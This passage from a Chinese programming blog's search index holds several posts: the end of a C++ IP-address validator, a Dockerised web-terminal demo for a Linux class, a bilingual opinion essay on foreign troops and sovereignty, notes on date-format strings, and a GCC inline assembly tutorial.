punctuation">;</span><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token keyword">typename</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> N<span class="token operator">&gt;</span><span class="token keyword">auto</span> <span class="token function">make_array</span><span class="token punctuation">(</span>N <span class="token operator">&amp;&amp;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>args<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> std<span class="token double-colon punctuation">::</span>array<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">forward</span><span class="token generic class-name"><span class="token operator">&lt;</span>N<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    Solution s<span class="token punctuation">;</span>    <span class="token keyword">auto</span>     inputs <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_array</span><span class="token generic class-name"><span class="token operator">&lt;</span>string<span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span><span class="token string">"172.16.254.1"</span><span class="token punctuation">,</span> <span class="token string">"2001:0db8:85a3:0:0:8A2E:0370:7334"</span><span class="token punctuation">,</span> <span class="token string">"256.256.256.256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>testCase<span class="token operator">:</span> inputs<span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> s<span class="token punctuation">.</span><span class="token function">validIPAddress</span><span class="token punctuation">(</span>testCase<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> EXIT_SUCCESS<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="refers">Refers</h2><ul><li>https://stackoverflow.com/questions/14265581/parse-split-a-string-in-c-using-string-delimiter-standard-c</li><li>https://stackoverflow.com/questions/8899069/how-to-find-if-a-given-string-conforms-to-hex-notation-eg-0x34ff-without-regex</li><li>https://stackoverflow.com/questions/791982/determine-if-a-string-is-a-valid-ipv4-address-in-c</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 思科 </tag>
            
            <tag> Cisco </tag>
            
            <tag> ACM </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速搭建网页 Linux 终端 Demo</title>
      <link href="/2023/03/05/kuai-su-da-jian-wang-ye-linux-zhong-duan-demo/"/>
      <url>/2023/03/05/kuai-su-da-jian-wang-ye-linux-zhong-duan-demo/</url>
      
        <content type="html"><![CDATA[<h1 id="快速搭建网页-linux-终端-demo">快速搭建网页 Linux 终端 Demo</h1><p>最近，学校的 Linux 课程开始了，一些同学可能在 Linux的安装上多多少少有问题。所以打算准备一个开箱即用的环境，你可能会提到SSH，可是都这样了，Web Terminal 不是更“开箱即用”吗？</p><h2 id="web-terminal">Web Terminal</h2><p>这里使用了 <a href="https://github.com/rabchev/web-terminal">rabchev/web-terminal</a>,配置比较简单。两条命令即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> web-terminal <span class="token parameter variable">-g</span>web-terminal <span class="token parameter variable">--port</span> <span class="token number">8088</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>在我这里会有 io.listen 相关报错，<code>sed -i 's/io.listen/io/g' /usr/local/lib/node_modules/web-terminal/lib/terminal.js</code>即可。</p></blockquote><h2 id="dockerlization">Dockerlization</h2><p>由于你不知道用户会搞出什么名堂，最好还是虚拟化一下。</p><h3 id="dockerfile">Dockerfile</h3><pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> node:14 # node &gt;= 10</span><span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">'s/deb.debian.org/mirrors.tuna.tsinghua.edu.cn/g'</span> /etc/apt/sources.list # 清华源</span><span class="token instruction"><span class="token keyword">RUN</span> apt-get update</span><span class="token instruction"><span class="token keyword">RUN</span> apt-get install -y x11-apps traceroute psmisc # cal commands</span><span class="token comment"># could add npm mirror</span><span class="token instruction"><span class="token keyword">RUN</span> npm install web-terminal -g</span><span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">'s/io.listen/io/g'</span> /usr/local/lib/node_modules/web-terminal/lib/terminal.js</span><span class="token instruction"><span class="token keyword">RUN</span> useradd -m -s /bin/bash nefu</span><span class="token instruction"><span class="token keyword">RUN</span> export WEB_SHELL=bash</span><span class="token instruction"><span class="token keyword">EXPOSE</span> 8088</span><span class="token instruction"><span class="token keyword">CMD</span> [ <span class="token string">"su"</span>, <span class="token string">"-"</span>, <span class="token string">"nefu"</span>, <span class="token string">"-c"</span>, <span class="token string">"web-terminal --port 8088"</span> ] # must be list form</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动一气呵成，置于守护态后设置自动重启即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A Sharp Comment on the U.S. Army Stationed in Japan</title>
      <link href="/2023/01/30/a-sharp-comment-on-the-u-s-army-stationed-in-japan/"/>
      <url>/2023/01/30/a-sharp-comment-on-the-u-s-army-stationed-in-japan/</url>
      
        <content type="html"><![CDATA[<p>我觉得这种——“一个国家有外国军队驻扎时，国民应该感到羞耻”的说法是非常无厘头的。</p><p>首先，虽然很多人在谈论主权时是认为主权这个概念是十分虔诚、神圣不可侵犯的，但实际上主权独立的定义是一直处在浮动中的，取决于统治者的需要，也是可以微调或改变的。我们可以观察到一种崇拜国家纯洁性的叙述。它提出这样一个观点：外国势力与本国国家的接触越少，国家就越纯洁。在这样的观念下，才会认为如果一个国家被外国势力“污染”，公民就应该感到羞耻，因为外国势力总是有潜在的危险，或者说“狼子野心”。但如果是这样的话，朝鲜由于拒绝外国资本，则可以在这种观念下获得更高的排名。在这种情况下，有一群人会说：因为经济的发展的必然性，我们有必要开放。</p><p>然而事实上，经济合作与政治、军事合作之间并没有真正的界限。如果你需要与外资合作，你必须承认不同国家之间存在普遍的法律和纪律，人们有可能相互相信和信任。如果你坚持认为经济合作比军事合作更安全，那么朝鲜可以说经济合作也会危及朝鲜的国家主权，因为外国势力想要消灭朝鲜的（共产主义）政权的趋势是永久性的。实际上，在改革开放之前，经济合作的主张会被视为国家的叛徒和资产阶级的代表。甚至与外国人接触也会被视为不洁和可疑。现代经济建立在大规模人口之间的分工与合作之上，这是常识。</p><p>但中国大陆陷入了是否应该承认普世价值的两难境地。要维持经济的发展，就应该坚持普世价值，在一定程度上放弃纯粹的叙事观点，否则，统治政权的合法性将受到冲击。但如果真正坚持普世价值，摒弃原有叙事，其合法性仍将受到挑战。宣传系统的工作难点在于在两极之间取得平衡。但可以看出，平衡点正在朝着强化国家主义叙事的方向发展。这个问题是隐藏在当前政治结构中的根本问题，应该在34年前解决。类似的困境也出现在晚清时期。 这并不乐观。</p><p>第二，同理，这个问题之所以能够成立，需要基于一个重要的假设，即国家的武装力量（不仅限于军队，还包括常规执法力量等）必须是能够比外国力量更好地保护人民的安全（各种），只有当这个假设成立时，你主权独立的优越感才能成立。但是有一种情况是：一国自己的军队压迫自己的人民，这个问题其实回避了一个反而更现实的问题——如果国家的军队也来欺压自己的人民，那这种优越感岂不是彻底消失了？显然，一个国家的武装部队虽然和你是同一国籍，但并不代表它一定会保护你的利益。只有当这台机器掌握在受监督的政府手中，并且通过透明公开的法律程序授权和允许它的行为时，你才能说这台暴力机器是为你服务的，否则它就具有压迫性。</p><p>所以问题的关键不再是军队是否和你有相同的国籍，而是军队是否有一个公开透明的机制进行监督。具体来说，当你行使一些法律认可的权利时，比如想拿回你的积蓄、你的工资，这支军队是在保护你的权利，还是在无视你的权利？当你不同意政府时，军队会严格保持中立立场，还是会明确表态？我们说侵略军是邪恶的，殖民主义是坏的。主要原因是侵略军或殖民者没有保护被占区或殖民地人民的财产权和生命权，尤其重要的是这种侵权行为无法通过法律程序予以纠正。至于驻日美军是否属于上述侵略军，则见仁见智。如果美军能够在大阪火车站阻止日本工人前往东京请愿，或者禁止千叶县的农民烧煤，那么这确实是一件值得日本民众好好反思的事情。</p><hr><p>I think this kind of sense of shame that a man should feel shame whenhis country has a stationed foreign army is very strange.</p><p>Firstly, though many people are devout and have a holy sense whenthey are talking about sovereignty, actually the definition of theindependence of sovereignty is floating and depend on the need of thegovernor, it can also be calculated and changed. We can observe anarrative that worships the purity of the state. It proposes such adimension: the less contact between a foreign power and its own state,the more pure the state is. If a state is "polluted" by a foreign power,the citizens should be shame because foreign power is always dangerouspotentially. But if so, North Korea can get a higher rank under thisnarrative due to its rejection of foreign capital. In this case, somepeople will say it is necessary to opening-up because of the developmentof the economy.</p><p>However, in fact, there is no real boundary between economiccooperation and military cooperation. If you need to cooperate withforeign capital, you must admit that there exists a universal law anddiscipline between different countries, and people have a possibility tobelieve and trust each other. If you insist that economic cooperation issafer than military cooperation, then North Korea can say economiccooperation will be also dangerous to the sovereignty, because of thepermanent tendency that foreign force wants to eliminate us. Actually,before the reform and opening up, the proposition of economiccooperation will be viewed as a traitor to the state and representativeof the bourgeois. Even contact with a foreigner will be viewed as impureand suspicious. It is common sense that the modern economy builds on thedivision of labor and cooperation between a large-scale population.</p><p>But China falls into a dilemma that if it should admit universalvalues. To maintain the development of the economy, it should insist onuniversal discipline and give up the narrative of purity to a certainextent, otherwise, the legitimacy of domination will be shocked. But ifit truly insists on universal discipline and abandons the originalnarrative, its legitimacy will still be challenged. The propagandasystem's working difficulty is to make a balance between the two poles.But it can be seen that the balanced point is moving in the direction ofstrengthening the statism narrative. This issue is the root trouble thatconceals in the current political structure which should be solvedbefore 34 years. A similar dilemma also emerged in the late QingDynasty. It is not optimistic.</p><p>Second, In the same way, the reason why this question can beestablished needs to be based on an important assumption, that is, thecountry's armed forces (not limited to the army, but also conventionallaw enforcement forces, etc.) must be able to protect the safety of thepeople better than foreign force, Only when this assumption is true,your sense of superiority can be established. But there is a situationthat one state's own army oppresses one's own people, this question isactually avoided, but it is a more real problem. If the country's armyalso oppresses its own people, wouldn't this sense of superioritycompletely disappear? Obviously, though a country's armed forces are ofthe same nationality as you, it does not mean that it will definitelyprotect your interests. Only when this machine is in the hands of asupervised government, and its actions are authorized and permittedthrough transparent and open legal procedures, you can say that thisviolent machine is serving you, otherwise, it has an oppressivenature.</p><p>So the crux of the issue is no longer whether the armed forces havethe same nationality as you, but whether the armed forces are supervisedby an open and transparent mechanism. Specifically, when you exercisesome legally recognized rights, such as wanting to get back your savingsand your wages, is this armed force protecting your rights or ignoringyour rights? When you disagree with the government, will the armedforces strictly maintain a neutral position, or will they clearlyexpress their views? We say that the invading army is evil and thatcolonialism is bad. The primary reason is that the invading army or thecolonists do not protect the property rights and the right to life ofthe people in the occupied areas or colonies, what is especiallyimportant is that this kind of infringement cannot be corrected by legalprocedures. As for whether the American troops stationed in Japan belongto the above-mentioned aggressor army, it is a matter of opinion. If theU.S. military can stop workers from going to Tokyo to petition at theOsaka railway station or prohibit farmers in Chiba from burning coal,then this is indeed something worthy of reflection by the Japanesepeople.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>日期格式化</title>
      <link href="/2023/01/26/ri-qi-ge-shi-hua/"/>
      <url>/2023/01/26/ri-qi-ge-shi-hua/</url>
      
        <content type="html"><![CDATA[<p><code>yyyy-MM-dd HH:mm:ss</code></p><p>年-月-日 时:分:秒</p><p>大写是为了区分“<strong>月</strong>”与“<strong>分</strong>”</p><p>顺便说下HH为什么大写，是为了区分<strong>12小时制</strong>与<strong>24小时制</strong>。</p><p>小写的h是12小时制，大写的H是24小时制。</p><p>书写格式和语言规定有关，上述写法是Windows系统中的我们常见的写法，包括日期设置于办公软件在内。在其他语言中有类似的但使用符号或格式不同的写法。</p><p>有的时候我们会看到这样的格式：<code>yyyy-M-d H:m:s</code></p><p>mm与m等，它们的区别为<strong>是否有<a href="https://www.zhihu.com/search?q=前导零&amp;search_source=Entity&amp;hybrid_search_source=Entity&amp;hybrid_search_extra=%7B%22sourceType%22%3A%22answer%22%2C%22sourceId%22%3A25475256%7D">前导零</a></strong>：H,m,s表示<strong>非零开始</strong>，HH,mm,ss表示<strong>从零开始</strong>。</p><p>比如凌晨1点2分，HH:mm显示为<strong>01:02</strong>，H:m显示为<strong>1:2</strong>。</p><p>以2014年1月1日凌晨1点1分1秒（当天是星期三）为例子介绍一下其他的：</p><p><strong>yyyy/yyy/yy/y</strong> 显示为<strong>2014/2014/14/4</strong></p><p>（3个y与4个y是一样的，为了便于理解多写成4个y）</p><p><strong>MMMM/MMM/MM/M</strong> 显示为<strong>一月/一月/01/1</strong></p><p>（4个M显示全称，3个M显示缩写，不过中文显示是一样的，英文就是January和Jan）</p><p><strong>dddd/ddd/dd/d</strong> 显示为<strong>星期三/周三</strong>(有的语言显示为“三”)<strong>/01/1</strong></p><p>（在英文中同M一样，4个d是全称，3个是简称；</p><p>dddd/ddd表示星期几，dd/d表示几号）</p><p><strong>HH/H/hh/h</strong> 显示为 <strong>01/1/01 AM/1AM</strong></p><p>剩下的<strong>mm/m/ss/s</strong>只是前导零的问题了。</p><p><code>yyyy/M/d/dddd H:mm:ss</code> 就是 2014年1月1日星期三1:01:01</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++ inline asm</title>
      <link href="/2023/01/24/c-inline-asm/"/>
      <url>/2023/01/24/c-inline-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="c-内联汇编">C++ 内联汇编</h1><h2 id="gcc汇编语法梗概">GCC汇编语法梗概</h2><h3 id="att-与-intel-汇编区别">AT&amp;T 与 Intel 汇编区别</h3><p>Linux GCC(GNU, C Compiler)使用AT&amp;T汇编语法。下面列一下AT&amp;T和Intel汇编语法中的不同：</p><h4 id="源-目的-顺序">源-目的 顺序</h4><p>AT&amp;T中源和目的操作数的顺序相反。Intel语法中第一个操作数是目的，第二个是源。而AT&amp;T语法中，第一个是源第二个操作数是目的。“Op-code src, dst” —— AT&amp;T 语法 “Op-code dst, src” —— Intel语法</p><h4 id="寄存器命名">寄存器命名</h4><p>AT&amp;T语法中，寄存器需要有‘%’前缀，例如eax需要写作%eax。这里只是强调Intel汇编语法中不使用各种前缀，具体寄存器命名后面会继续涉及。</p><h4 id="立即数">立即数</h4><p>AT&amp;T中立即数需要有‘<span class="math inline">\(’前缀。如果是静态“C”变量，同样需要’\)</span>’前缀。Intel语法中，16进制需要’h’前缀，而AT&amp;T则需要‘0x’前缀。所以，对于16进制的立即数写作‘$0x1234’</p><h4 id="操作数大小">操作数大小</h4><p>在AT&amp;T语法中，内存操作数的大小取决于Op-code的<em>后缀</em>字母’b’’w’以及’l’，分别指代’字节(8bit)字(16bit) 和长字(32bit)内存指针。而Intel语法使用前置限定符’byte ptr’‘word ptr’ 以及’dword prt’。 所以下面两句等效：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">Intel "mov al, byte ptr foo"At&amp;T  "movb foo, %al"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="内存地址的访问">内存地址的访问</h4><p>在AT&amp;T中基址寄存器使用’()’，Intel中使用’[]’。 下面两句等效：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">Intel "section: [base + index*scale + disp]"AT&amp;T  "section: disp(base, index, scale)"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="gnu-att汇编">GNU AT&amp;T汇编</h3><h4 id="寄存器">寄存器</h4><p>现代X86处理器（例如386及其以后）有8个32位通用寄存器（general purposeregisters,GPR）如图: <img src="https://googles.plus/images/loading.gif" data-original="https://www.owalle.com/2019/05/22/inline-assembly/x86-registers.png" alt="x86-registers.png"></p><p>寄存器名字是继承过来的。例如EAX成为<strong>累加器</strong>，因为之前被大量的算法这样操作，ECX被称为计数器，因为它通常用来作为循环的索引。然而，在现代指令集中，大多数寄存器已经失去了它之前特殊的用途。但有两个例外的——堆指针（ESP）和基址指针（EBP)。对于EAX EBXECX以及EDX，可以分段使用。例如，EAX的低2字节可以看做是16位寄存器，称作AX；低1字节可以看做8位寄存器，称作AL，而AX的高字节也可以看作是8位寄存器，成为AH。这些寄存器名字都指向相同的物理寄存器。当2字节数值存入DX中的时候，它会影响DH，DL以及EDX。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movb $2, (%ebx)/* Move 2 into the single byte at the address stored in EBX. */movw $2, (%ebx)/* Move the 16-bit integer representation of 2 into the 2 bytes starting at the address in EBX. */movl $2, (%ebx) /* Move the 32-bit integer representation of 2 into the 4 bytes starting at the address in EBX. */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="内存操作符">内存操作符</h4><p>X86指令中，我们可以生命静态数据区域（类似全局变量）。使用<code>.data</code>指令来声明，紧跟在<code>.data</code>指令之后，使用指令<code>.byte</code>,<code>.short</code>以及<code>.long</code>来声明1,2或者4字节数据位置，然后使用标签来引用之前创建的数据区。标签可以看做是内存区域的名字，可以在之后的汇编或者连接器中使用标签，这就跟用名字声明变量非常的相似，但稍微有些不同。比如，一个连续的内存数据位置的声明他们在内存中的位置是连续的。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.datavar:.byte 64/* Declare a byte, referred to as location var, containing the value 64. */.byte 10/* Declare a byte with no label, containing the value 10. Its location is var + 1. */x:.short 42/* Declare a 2-byte value initialized to 42, referred to as location x. */y:.long 30000    /* Declare a 4-byte value, referred to as location y, initialized to 30000. */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并不像高级语言那样，数组可以有各种容量，并且可以使用索引访问。X86汇编中的数组仅仅是简单的一些内存中接续的存储单元。数组可以通过列出数值累声明（例如第一个例子）。对于一些特别的数组，可以使用字符串；再如果一个很大的内存需要填充0，那么可使用<code>.zero</code>指令。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">s:.long 1, 2, 3/* Declare three 4-byte values, initialized to 1, 2, and 3. The value at location s + 8 will be 3. */barr:.zero 10/* Declare 10 bytes starting at location barr, initialized to 0. */str:.string "hello"   /* Declare 6 bytes starting at the address str initialized to the ASCII character values for hello followed by a nul (0) byte. */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内存寻址">内存寻址</h4><p>现代X86处理器最高可寻址2^32字节的内存地址（内存地址有32位宽）。上面的例子中，我们使用标签指向内存区域，这些标签实际上被编译器用实际32位地址取代。为了更进一步支持<strong>标签指向内存地址</strong>（例如常量），X86提供了一个灵活的计算和引用内存地址的方法：两个32位寄存器以及一个32位有符号常量相加，并且其中一个寄存器可以被2,4,8相乘。有一点需要注意，当disp/scale中使用常数的时候，这里不再需要”$”前缀。</p><table><thead><tr class="header"><th style="text-align: left;">Intel 代码</th><th style="text-align: left;">AT&amp;T 代码</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">mov eax, 1</td><td style="text-align: left;">movl $1, %eax</td></tr><tr class="even"><td style="text-align: left;">mov ebx, 0ffh</td><td style="text-align: left;">movl $0xff, %ebx</td></tr><tr class="odd"><td style="text-align: left;">int 80h</td><td style="text-align: left;">int $0x80</td></tr><tr class="even"><td style="text-align: left;">mov ebx, eax</td><td style="text-align: left;">mov %eax, %ebx</td></tr><tr class="odd"><td style="text-align: left;">mov eax, [ecx]</td><td style="text-align: left;">movl (%ecx), %eax</td></tr><tr class="even"><td style="text-align: left;">mov eax, [ebx + 3]</td><td style="text-align: left;">movl 3(%ebx), %eax</td></tr><tr class="odd"><td style="text-align: left;">mov eax, [ebx + 20h]</td><td style="text-align: left;">movl 0x20(%ebx), %eax</td></tr><tr class="even"><td style="text-align: left;">mov eax, [ebx + ecx]</td><td style="text-align: left;">movl (%ebx,%ecx), %eax</td></tr><tr class="odd"><td style="text-align: left;">mov eax, [ebx + ecx*2h]</td><td style="text-align: left;">movl (%ebx,%ecx,0x2), %eax</td></tr><tr class="even"><td style="text-align: left;">mov eax, [ebx + ecx*4h-20h]`</td><td style="text-align: left;">movl -0x20(%ebx,%ecx,0x4), %eax</td></tr></tbody></table><h2 id="基本内联">基本内联</h2><p>基本内联汇编的格式比较简单：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm("assembly code");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm("movl %ecx, %eax");//把ecx中的内容移动到eax中__asm__("movb %bh, (%eax)") //把寄存器bh中的内容移动到eax指向的内存地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里有几点注意事项：</p><ol type="1"><li>千万不要忘记src, dst两个操作数之间的逗号’,’</li><li>这里<code>asm()</code> 和 <code>__asm()__</code> 都是有效的。</li><li>如果有多行汇编，需要在每行末尾添加<code>\n\t</code>，除最后一行汇编的末尾。例如：</li></ol><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">__asm__ ("movl %eax, %ebx\n\t"         "movl $56, %esi\n\t"         "movl %ecx, $label(%edx,%ebx,$4)\n\t"         "movb %ah, (%ebx)");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果在代码中，更改过一些寄存器并从asm返回后，则会发生一些难以预料的事情。这是因为GCC不知道寄存器内容的变化，所致，特别是当编译器进行一些优化时。这就需要一些扩展功能的地方。下面来看下<strong>扩展的asm</strong>语法。</p><h2 id="扩展的asm">扩展的ASM</h2><p>在基本内联汇编中，我们只有指令。但在扩展汇编中，我们可以指定操作数。并且允许指定输入寄存器，输出寄存器以及改动的寄存器列表。但不强制使用寄存器。格式如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ( assembler template     : output operands                  /* optional */    : input operands                   /* optional */    : list of clobbered registers      /* optional */    );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果没有输出操作符，但有输入操作，也必须保留两个冒号，例如:</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("cld\n\t"//多行指令     "rep\n\t"     "stosl"     : /* 没有输出寄存器 */     : "c" (count), "a" (fill_value), "D" (dest)     : "%ecx", "%edi"      );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上段代码意思是，把fill_value变量中的值往edi指向的内存地址写入count次。也就是说，eax和edi中的内容不再有效。再来看下面的例子：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">int a=10, b;asm ("movl %1, %%eax;\n\t"      "movl %%eax, %0;"     :"=r"(b)        /* output */     :"r"(a)         /* input */     :"%eax"         /* clobbered register */     );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码意思是，把变量a的值赋值给b。</p><ul><li><p>‘b’是输出操作符，%0引用它，并且’a’是输入操作符，1%引用它。</p></li><li><p>‘r’是操作符的限定符。这里’r’告诉GCC可以使用任意一个寄存器来存储操作符。’=’是输出操作符的限定符，并且是只写的。</p></li><li><p>在寄存器之前有两个’%’号。用来帮助GCC区别操作符还是寄存器。操作符只有一个’%’前缀。换句话说，<strong>在扩展ASM语法中，如果在汇编中直接使用寄存器名字而不是通过%0%1这样引用，则寄存器前需要两个%限定</strong>。</p></li><li><p>改动的寄存器%eax列在第三个冒号在后，告诉GCC%eax的值在汇编中有改动，所以GCC不会再用这个寄存器存储其他的值。当asm结束时，’b’会反应更新过的数据，因为他被指定为输出操作符。换句话说，在汇编中改变’b’的值，会被反映到汇编之外。</p></li><li><p>但如果一个寄存器已经出现在输出操作符列表中，那么无需再将它添加到clobberlist里，如果添加了编译的时候会报错。例如下面这段汇编是错误的：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">int a=10, b;asm ("movl %1, %%eax;   \n\t"    "movl %%eax, %0;"    :"=b"(b)        /* 明确指出使用寄存器ebx */    :"r"(a)         /* input  */    :"%eax", "%ebx"         /* 编译出错！！ */    );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="编译器模板">编译器模板</h3><h4 id="操作数">操作数</h4><p>每个操作数都必须包含在“”之内。对于输出操作数，双引号（“”）中会多一个限定符，用来决定限定符地址的模式。如果有多个操作数，他们使用逗号（，）隔开。每个操作数都可以通过数字来引用，按照顺序一次命名。输入和输出操作数依次命名，第一个输出的操作数记作0，后面依次增加。输出操作数必须是长类型，输入操作数没有这个限制。扩展汇编最常用来调用机器指令本身，跟编译器无关。如果输出表达式不是一个直接地址，例如一个位阈，限定符必须是寄存器。此事，GCC会使用寄存器作为内联汇编的输出，并且把寄存器的值存储到输出里。综上，原始输出操作数必须是“只写”的；GCC假定在指令结束之前，数值都在这些操作数中，并且不需要生成。扩展汇编也支持读写操作数。来看几个例子：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("leal (%1, %1, 4), %0"     : "=r" (five_times_x)     : "r" (x)      );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个例子中，输入是’x’，并且没有指定寄存器。GCC会自己选择一个。再同样给输出选择一个寄存器。如果我们想要输入输出使用同一个寄存器，可以告诉GCC我们希望那种读写的操作数，比如：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("leal (%0, %0, 4), %0"     : "=r" (five_times_x)     : "0" (x)      );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>此时，输入输出操作数会是同一个寄存器。但我们并不知道是具体那一个。如果想明确指定某一个寄存器，也有方法，比如：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("leal (%%ecx,%%ecx,4), %%ecx"     : "=c" (x)     : "c" (x)      );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>以上三个例子，并没有指定任何改动寄存器列表，为什么？前两个例子，GCC决定使用哪个寄存器，它会知道寄存器发生的变化。在最后一个例子中，我们也没有指定变化寄存器，因为GCC知道值最终保存到x中，在汇编之外，它知道ecx的值了，所以没有必要列出变化寄存器列表(clobberlist)，如果列上<code>%ecx</code>编译就会错误。</p><h4 id="变化寄存器列表clobber">变化寄存器列表(clobber)</h4><p>有些指令会改变硬件寄存器，因此必须明确指出这些改动过的寄存器，将其列在第三个’:’之后。这是为了告诉GCC汇编使用并修改了那些寄存器。所以，GCC会知道之前被加载到这些寄存器的值已经无效了。同时没有必要列出放在输入和输出操作数中的寄存器，以内GCC知道内联已经使用了他们。需要明确指出的是那些没有明确指出的隐式使用的寄存器，那些没有列在输入和输出操作数中的寄存器。如果指令修改了内存，需要在clobberlist中添加”memory”。这样通知GCC内存缓存应该失效了。同时必须添加’volatile’关键字，如果内存修改并没有列在输入和输出操作数中时。我们多次可以读写更改的寄存器，参考下面的例子，意思是调用子程序_foo，并且通过eax和 ecx传递两个参数给他。<strong>注：这里的寄存器名字前是否加%，<code>eax</code>和<code>%eax</code>都是正确的！</strong></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">asm ("movl %0,%%eax; \n\t"     "movl %1,%%ecx;\n\t"     "call _foo"     : /* no outputs */     : "g" (from), "g" (to)     : "eax", "ecx"     );<span aria-hidden="true" 